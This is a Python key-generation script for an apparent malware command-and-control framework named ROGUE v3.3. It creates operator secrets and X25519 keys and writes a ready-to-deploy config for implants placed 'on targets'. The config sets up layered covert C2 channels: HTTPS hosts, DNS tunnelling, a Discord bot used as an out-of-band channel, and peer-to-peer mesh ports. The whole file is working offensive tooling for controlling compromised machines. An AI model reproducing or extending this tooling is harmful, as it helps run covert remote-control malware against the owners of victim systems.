#!/usr/bin/env python3
"""
ROGUE v3.3 key generator
========================
Creates the operator secret + X25519 static keypair the C2 needs, stores them
under ./rogue_keys (mode 0700) and prints the exact snippet to drop into an
implant's rogue_v2_config.py (deployed next to rogue_implant.py on targets).

    python3 scripts/rogue_keygen.py [--dir ./rogue_keys] [--config-out implant_config.py]

The C2 (rogue_c2.py) also auto-creates keys on first run - this script is for
pre-generating and for building implant configs offline.
"""
import argparse
import base64
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))


def main():
    ap = argparse.ArgumentParser(description="ROGUE v3.3 keygen")
    ap.add_argument("--dir", default=os.path.join(os.getcwd(), "rogue_keys"))
    ap.add_argument("--config-out", default=None,
                    help="also write a ready-to-deploy implant config file here")
    args = ap.parse_args()

    from rogue_v2_core import rv2_b64e, rv2_gen_static_key, rv2_rand

    os.makedirs(args.dir, exist_ok=True)
    os.chmod(args.dir, 0o700)

    secret_path = os.path.join(args.dir, "operator.secret")
    priv_path = os.path.join(args.dir, "static_priv.bin")
    pub_path = os.path.join(args.dir, "static_pub.b64")

    secret = os.environ.get("ROGUE_SECRET") or rv2_rand(32).hex()
    with open(secret_path, "w") as f:
        f.write(secret)
    os.chmod(secret_path, 0o600)

    priv, pub = rv2_gen_static_key()
    if not priv:
        print("[!] ECDH backend unavailable - implants will use PSK mode only")
        pub_b64 = ""
    else:
        pub_b64 = rv2_b64e(pub)
        with open(priv_path, "wb") as f:
            f.write(priv)
        os.chmod(priv_path, 0o600)
        with open(pub_path, "w") as f:
            f.write(pub_b64)

    print("[+] keys written to %s" % args.dir)
    print("[+] operator secret : %s" % secret)
    print("[+] static pub (b64): %s" % pub_b64)

    snippet = """# ROGUE v3.3 implant config - deploy next to rogue_implant.py
# (chmod 600; the implant also reads ROGUE_* env vars as an alternative)
secret = '%s'
static_pub = '%s'
c2_hosts = ['https://YOUR_C2_HOST/']      # tier 0: HTTPS C2 (mirrors OK)
dns_zone = ''                              # tier 1: e.g. 'c2.example.com'
dns_resolver = ''                          #         operator DNS bridge IP
oob_read_url = ''                          # tier 3: channel URL (discord api)
oob_webhook = ''                           #         result webhook URL
oob_token = ''                             #         channel bot token
p2p_ports = (7008, 7009, 7010, 7011)       # tier 2: mesh ports (always on)
legacy_fallback = True
""" % (secret, pub_b64)

    out = args.config_out
    if out:
        with open(out, "w") as f:
            f.write(snippet)
        os.chmod(out, 0o600)
        print("[+] implant config written to %s" % out)
    else:
        print("\n# ---- implant config snippet (rogue_v2_config.py) ----")
        print(snippet)
    return 0


if __name__ == "__main__":
    sys.exit(main())
